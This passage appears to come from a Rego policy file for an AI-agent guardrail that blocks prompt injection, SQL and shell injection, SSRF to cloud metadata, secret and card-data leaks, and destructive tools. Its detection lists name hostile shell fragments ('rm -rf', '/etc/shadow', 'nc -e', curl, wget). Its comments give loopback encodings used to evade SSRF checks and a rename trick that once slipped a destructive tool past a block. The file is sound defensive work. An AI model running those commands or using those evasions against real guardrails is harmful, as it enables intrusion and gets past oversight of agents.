_derived_class(c) { object.get(input.derived, "data_classes", [])[_] == c }
pii_detected { _derived_class("pii") }
pci_value_detected { _derived_class("pci") }
data_leakage_detected { value_pattern_sink; _derived_class("secret") }

# --- F-006: SSRF to cloud metadata / loopback --------------------------------------------------
#
# The stock baseline allowed `http_fetch` to `169.254.169.254/latest/meta-data/`. That one call
# returns the node's role credentials, and every policy written above that point is then moot — so
# this is a baseline floor, not a per-agent business rule.
#
# Reads `derived.destinations.internal`, which the engine computes with `ipaddress` (see
# norviq/engine/ssrf.py). The alternate encodings are the entire attack — `2130706433`,
# `0x7f000001`, `017700000001`, `127.1`, `::ffff:127.0.0.1` and `localhost` are all the same
# destination — and a Rego pattern enumerating those spellings would both miss one and cost a regex
# op this file does not have (it sits at 24 of the API validator's 25).
#
# ONLY metadata and loopback. RFC1918 is classified and published as `private` but is NOT blocked: an
# agent in Kubernetes talks to in-cluster services on 10.x/172.16-31.x constantly, and a baseline that
# refused ordinary internal traffic would be switched off within a day — the same over-block lesson as
# `sensitive_keys` holding the bare key `token`. A customer who wants that rule can write it against
# `derived.destinations.internal.private`.
ssrf_internal_target { count(object.get(_internal_dests, "metadata", [])) > 0 }
ssrf_internal_target { count(object.get(_internal_dests, "loopback", [])) > 0 }
_internal_dests = object.get(object.get(input.derived, "destinations", {}), "internal", {})

# Supply chain
supply_chain_tools = {"load_plugin", "download_script", "eval", "install_package"}

# PII — walk() recurses nested objects/arrays so {payload:{ssn:…}} is caught like a flat {ssn:…}.
pii_detected {
    walk(input.tool_params, [_, val])
    is_string(val)
    regex.match(`^(\d{3}-\d{2}-\d{4}|\d{4}-\d{2}-\d{2}|[A-Z]{2}\d{7})$`, val)
}
pii_detected {
    walk(input.tool_params, [_, val])
    is_string(val)
    regex.match(`\b\d{3}-\d{2}-\d{4}\b`, val)
}

# PCI
pci_keys = {"cc_number", "card_number", "credit_card"}

# A PAN-named key at ANY depth (last path element is the immediate key).
pci_field_detected {
    walk(input.tool_params, [path, _])
    count(path) > 0
    k := path[count(path) - 1]
    is_string(k)
    pci_keys[lower(k)]
}

pci_value_detected {
    walk(input.tool_params, [_, val])
    is_string(val)
    regex.match(`^\d{13,19}$`, val)
    luhn_valid(val)
}
pci_value_detected {
    walk(input.tool_params, [_, val])
    is_string(val)
    candidate := regex.find_n(`\d{4}[ -]?\d{4}[ -]?\d{4}[ -]?\d{4}`, val, -1)[_]
    digits_only := regex.replace(candidate, `[ -]`, "")
    count(digits_only) == 16
    luhn_valid(digits_only)
}

luhn_valid(s) {
    digits := [to_number(c) | c := regex.find_n(`[0-9]`, s, -1)[_]]
    n := count(digits)
    total := sum([x | some i; v := digits[i]; x := luhn_digit(v, (n - 1 - i) % 2)])
    total % 10 == 0
}
luhn_digit(d, parity) = d {
    parity == 0
}
luhn_digit(d, parity) = doubled {
    parity == 1
    doubled := d * 2
    doubled <= 9
}
luhn_digit(d, parity) = sub {
    parity == 1
    doubled := d * 2
    doubled > 9
    sub := doubled - 9
}

# Cross-tenant
cross_tenant_detected {
    input.tool_params.tenant_id
    input.tool_params.tenant_id != input.agent.namespace
}
cross_tenant_detected {
    input.tool_params.namespace
    input.tool_params.namespace != input.agent.namespace
}

# A SQL query reaching into a schema that is not the agent's own namespace
# (e.g. "SELECT * FROM payments.users" from ns=default). The boundary is in the schema qualifier, which the
# param-based checks above never inspect. Common non-tenant schemas are allow-listed.
safe_schemas = {"public", "information_schema", "pg_catalog", "sys", "dbo"}

cross_tenant_detected {
    input.tool_name == "execute_sql"
    is_string(input.tool_params.query)
    m := regex.find_all_string_submatch_n(`(?:from|join)\s+([a-z_][a-z0-9_]*)\.`, lower(input.tool_params.query), -1)[_]
    schema := m[1]
    schema != lower(input.agent.namespace)
    not safe_schemas[schema]
}

# A chained/recursive tool call past a safe depth. The engine sets input.call_depth from the
# event's call_depth.
max_safe_call_depth = 8

chain_depth_exceeded {
    input.call_depth >= max_safe_call_depth
}

b64_candidate_clean(v) = out {
    out0 := regex.replace(v, `\s+`, "")
    out1 := regex.replace(out0, "​", "")
    out2 := regex.replace(out1, "‌", "")
    out3 := regex.replace(out2, "‍", "")
    out4 := regex.replace(out3, `-`, "+")
    out := regex.replace(out4, `_`, "/")
}

# Bound the WORK, not the input size: a size gate that skips the base64 fan-out once tool_params
# serialize past a byte threshold lets padded tool_params evade decode detection. Instead ALWAYS run
# the decode scan but cap the NUMBER of base64 candidates decoded per level; a payload with more
# candidates than the cap is caught by the backstop threat rule below (can't bury a blob past the
# scanned window).
b64_scan_max_candidates = 64

# Deterministic, size-independent candidate list: every string value that normalizes to a valid base64
# blob, sorted so the capped slice is stable across evaluations.
b64_candidates = sort([val |
    walk(input.tool_params, [_, val])
    is_string(val)
    c := b64_norm(val)
    c != ""
])

# Re-pad a cleaned base64 candidate to a valid length so base64.decode never errors on unpadded
# input (b64 length%4 must be 0/2/3; ==1 is invalid -> undefined -> skipped).
b64_pad(s) = s { count(s) % 4 == 0 }
b64_pad(s) = sprintf("%s==", [s]) { count(s) % 4 == 2 }
b64_pad(s) = sprintf("%s=", [s]) { count(s) % 4 == 3 }

# Normalize any string into a decodable base64 candidate. The floor is on the ENCODED length only
# for validity (>= 8, i.e. >= ~5 decoded bytes) — the actual THREAT gate is the DECODED content matching a
# malicious pattern, so short encoded payloads like base64("rm -rf /") (12 chars) are not skipped.
b64_norm(v) = out {
    cleaned := b64_candidate_clean(v)
    stripped := trim_right(cleaned, "=")
    count(stripped) >= 8
    regex.match(`^[A-Za-z0-9+/]+$`, stripped)
    not regex.match(`^\d+$`, stripped)
    out := b64_pad(stripped)
}

# Bounded iterative decode to depth 4 so triple-nested base64 cannot evade. Each level re-normalizes +
# decodes the previous level's output; the depth cap bounds cost.
b64_decoded_l1[d] {
    some idx
    val := b64_candidates[idx]
    idx < b64_scan_max_candidates
    c := b64_norm(val)
    d := base64.decode(c)
}
b64_decoded_l2[d] { p := b64_decoded_l1[_]; c := b64_norm(p); d := base64.decode(c) }
b64_decoded_l3[d] { p := b64_decoded_l2[_]; c := b64_norm(p); d := base64.decode(c) }
b64_decoded_l4[d] { p := b64_decoded_l3[_]; c := b64_norm(p); d := base64.decode(c) }

b64_decoded_raw[d] { d := b64_decoded_l1[_] }
b64_decoded_raw[d] { d := b64_decoded_l2[_] }
b64_decoded_raw[d] { d := b64_decoded_l3[_] }
b64_decoded_raw[d] { d := b64_decoded_l4[_] }

b64_decoded[decoded] {
    raw := b64_decoded_raw[_]
    decoded := lower(raw)
}

decoded_shell_patterns = ["rm -rf", "/etc/passwd", "/etc/shadow", "wget ", "curl ", "nc -e"]

base64_decoded_threat {
    decoded := b64_decoded[_]
    contains(decoded, sql_patterns[_])
}
base64_decoded_threat {
    decoded := b64_decoded[_]
    contains(decoded, decoded_shell_patterns[_])
}
base64_decoded_threat {
    decoded := b64_decoded[_]
    regex.match(`\b\d{3}-\d{2}-\d{4}\b`, decoded)
}
# Backstop: more base64 candidates than the scan cap could bury a malicious blob past the scanned
# slice — treat that anomaly as a threat so an attacker cannot pad past the cap. Mirrors comprehensive.rego.
base64_decoded_threat {
    count(b64_candidates) > b64_scan_max_candidates
}

# Scope violation
scope_violation_dangerous_tool {
    input.tool_name == "execute_sql"
    input.agent.agent_class == "customer-support"
}

# --- partial-set triggers (rule_id -> guard) ---
#
# >>> CONTROLS-BEGIN
# Everything between these markers is the CONTROL REGISTRATION section, and it is the only part of
# this file the baseline compiler (norviq/api/baseline.py) rewrites. Each line binds one control id to
# one guard; the detector predicates above are a shared library and are never touched.
#
# A control's effect is purely which set its head registers into:
#   deny    -> blocks[...]  (or escalates[...], preserving the head's original severity)
#   monitor -> audits[...]  — evaluated, recorded as non-compliant, call proceeds
#   off     -> omitted entirely
#
# So changing what a control DOES never changes how it DETECTS. Keep every head on a single line in
# the form `set["control_id"] { guard }` — the compiler parses this region line by line, and a head
# split across lines is silently dropped, which would turn a control off without saying so.
blocks["llm01_prompt_injection"] { injection_detected }
blocks["deny_sql_injection"] { sql_injection_detected }
blocks["deny_shell_execution"] { shell_injection_detected }
blocks["llm06_excessive_agency"] { destructive_tools[input.tool_name] }
blocks["llm02_data_leakage"] { data_leakage_detected }
blocks["llm02_data_leakage"] { secret_egress_detected }
blocks["llm05_supply_chain"] { supply_chain_tools[input.tool_name] }
blocks["dangerous_scheme"] { dangerous_scheme_detected }
blocks["ssrf_metadata"] { ssrf_internal_target }
blocks["pii_detection"] { pii_detected }
blocks["pci_card_numbers"] { pci_field_detected }
blocks["pci_card_numbers"] { pci_value_detected }
blocks["cross_tenant_access"] { cross_tenant_detected }
blocks["chain_depth_limit"] { chain_depth_exceeded }
blocks["base64_decoded_threat"] { base64_decoded_threat }
# Baseline high-risk tool-name blocks (the core strict preset behavior), kept on top of the
# composed content detectors above.
blocks["strict_default_block"] { input.tool_name == "execute_sql" }
blocks["strict_default_block"] { startswith(lower(input.tool_name), "delete_") }
blocks["strict_default_block"] { startswith(lower(input.tool_name), "drop_") }
blocks["strict_default_block"] { startswith(lower(input.tool_name), "truncate_") }
blocks["strict_default_block"] { startswith(lower(input.tool_name), "destroy_") }
# Reach 7-verb parity with comprehensive.rego:207-211 destructive_verb_tool: a RENAMED destructive
# tool (wipe_table / purge_db / erase_records) must not fall through to allow on the DEFAULT
# webhook-enforced path, so the wipe_/purge_/erase_ prefixes are covered too.
blocks["strict_default_block"] { startswith(lower(input.tool_name), "wipe_") }
blocks["strict_default_block"] { startswith(lower(input.tool_name), "purge_") }
blocks["strict_default_block"] { startswith(lower(input.tool_name), "erase_") }
# ...and the same verb ANYWHERE in the name, not only at the front. Every arm above is `startswith`
# on a caller-supplied string, so the control was opt-out-able by rename: measured live on AKS,
# `delete_all_records` was caught on 75/75 calls and `get_delete_all_records` was allowed on 75/75.
# One prefix turned a control that fires on every call into one that fires on none. Same root cause
# as the homoglyph tool name (C2-012) and the destination-keyed control (C2-013): a name the attacker
# writes was the whole input.
#
# NOT keyed on `derived.verb`, and that is the point worth keeping. Keying the BLOCK on the classifier
# looks obvious and is wrong: `classify_tool` takes the WORST verb over all name tokens, so it
# over-classifies — `classify_tool("run_query")` and `classify_tool("execute_sql")` both return
# `delete`. An arm blocking `verb == "delete"` therefore refuses ordinary read tools, which
# tests/engine/test_capability.py::test_reads_are_not_swept_up_by_the_wider_lexicon caught immediately.
# Over-classification is safe where it NARROWS (the rate-limit exemption asks for `read`, so a
# mislabelled read is merely throttled) and unsafe where it BLOCKS. Different direction, different
# rule.
#
# So: whole TOKENS over `tool_name_tokens`, the same primitive and the same reasoning the egress
# section above uses — which also means `getDeleteAllRecords` cannot dodge it by dropping the
# underscores, since `name_split_map` splits camelCase first. Whole tokens rather than substrings so
# `undelete_`, `delete_candidates_report` style NOUNS are the only residual, and this control's
# shipped caveat already documents that it matches on the name with no regard to arguments.
blocks["strict_default_block"] { destructive_name_tokens[lower(tool_name_tokens[_])] }
blocks["strict_default_block"] { destructive_name_tokens[lower(tool_name_normalized_tokens[_])] }

escalates["llm06_excessive_agency"] { elevated_tools[input.tool_name] }

audits["scope_violation_dangerous_tool"] { scope_violation_dangerous_tool }

# Moved here from beside its predicate (~line 800) so every registration head lives in one region.
# The predicate `_sql_metachar_only_block` stays where it is with the rest of the SQL detectors; only
# the binding moved. A head outside these markers would be invisible to the compiler, so its control
# could never be toggled and would silently keep enforcing at whatever severity it was written with.
blocks["deny_sql_multi_statement"] { _sql_metachar_only_block }
# >>> CONTROLS-END

# reason text per rule_id. default_allow + the engine fallback are included for completeness.
reasons = {
    "llm01_prompt_injection": "Prompt injection pattern detected (OWASP LLM01)",
    "deny_sql_injection": "SQL injection pattern in tool parameters",
    "deny_sql_multi_statement": "Multi-statement or metacharacter SQL rejected on execute_sql",
    "deny_shell_execution": "Shell / command-execution pattern detected",
    "llm06_excessive_agency": "Excessive agency — destructive or elevated tool (OWASP LLM06)",
    "llm02_data_leakage": "Sensitive data sent to an external tool (OWASP LLM02)",
    "llm05_supply_chain": "Untrusted code / plugin load (OWASP LLM05)",
    "dangerous_scheme": "Non-HTTP URL scheme (file/gopher/dict/…) — local-file or SSRF read",
    "ssrf_metadata": "Request to a cloud metadata or loopback address (SSRF / credential theft)",
    "pii_detection": "PII (SSN) detected in tool parameters",
    "pci_card_numbers": "Payment card data (PAN) detected — PCI DSS",
    "cross_tenant_access": "Cross-tenant / cross-namespace access denied",
    "chain_depth_limit": "Chained tool-call depth exceeds the safe limit (agent chaining / recursion) — OWASP LLM08",
    "base64_decoded_threat": "Base64-encoded payload decodes to a known-malicious pattern",
    "scope_violation_dangerous_tool": "Out-of-scope dangerous tool for this agent class",
    "strict_default_block": "Strict baseline blocked a high-risk tool",
    "default_allow": "Allowed",
}

# --- resolver: block > escalate > audit > allow; deterministic sorted rule_id; reason from the map ---
block_fired { blocks[_] }
escalate_fired { escalates[_] }
audit_fired { audits[_] }

decision = "block" { block_fired }
decision = "escalate" { escalate_fired; not block_fired }
decision = "audit" { audit_fired; not block_fired; not escalate_fired }

# Attribute a SQL block carrying ";" (also a shell metachar) to deny_sql_injection, not deny_shell_execution —
# label only; block SET/decision unchanged; shell still wins for genuine shell payloads. Mirrors comprehensive.rego.
# `;` and `|` are ORDINARY SQL SYNTAX — a statement separator and concatenation/bitwise-or — so on
# execute_sql their presence is not evidence of shell execution. A blocked multi-statement query was
# therefore reported as "deny_shell_execution": the audit log showed a shell-execution attempt that
# never happened, and the real reason (SQL) was hidden from whoever triaged it.
#
# Shadowing the shell label alone would be wrong: when shell is the ONLY block, removing it from the
# candidate list leaves `rule_id` UNDEFINED on a decision that is still "block" — a block with no rule.
# So this names the case explicitly and adds it to the block set, keeping a label available always.
# Genuine shell markers ("$(", backtick, rm -rf, /etc/passwd) still win: those are a real shell payload
# smuggled through a SQL parameter, not SQL syntax.
sql_genuine_shell_markers = ["$(", "`", "rm -rf", "/etc/passwd", "/etc/shadow", "nc -e"]

_genuine_shell_marker_present {
    val := security_scan_texts_raw[_]
    pattern := sql_genuine_shell_markers[_]
    contains(val, pattern)
}
_genuine_shell_marker_present {
    val := lower(security_scan_decoded_raw[_])
    pattern := sql_genuine_shell_markers[_]
    contains(val, pattern)
}

# execute_sql blocked purely on SQL metacharacters — same decision, honest attribution.
_sql_metachar_only_block {
    input.tool_name == "execute_sql"
    shell_injection_detected
    not _genuine_shell_marker_present
}
_shell_shadowed_by_sql(id) { id == "deny_shell_execution"; sql_injection_detected }
_shell_shadowed_by_sql(id) { id == "deny_shell_execution"; _sql_metachar_only_block }
rule_id = sort([id | blocks[id]; not _shell_shadowed_by_sql(id)])[0] { block_fired }
rule_id = sort([id | escalates[id]])[0] { escalate_fired; not block_fired }
rule_id = sort([id | audits[id]])[0] { audit_fired; not block_fired; not escalate_fired }

reason = reasons[rule_id]
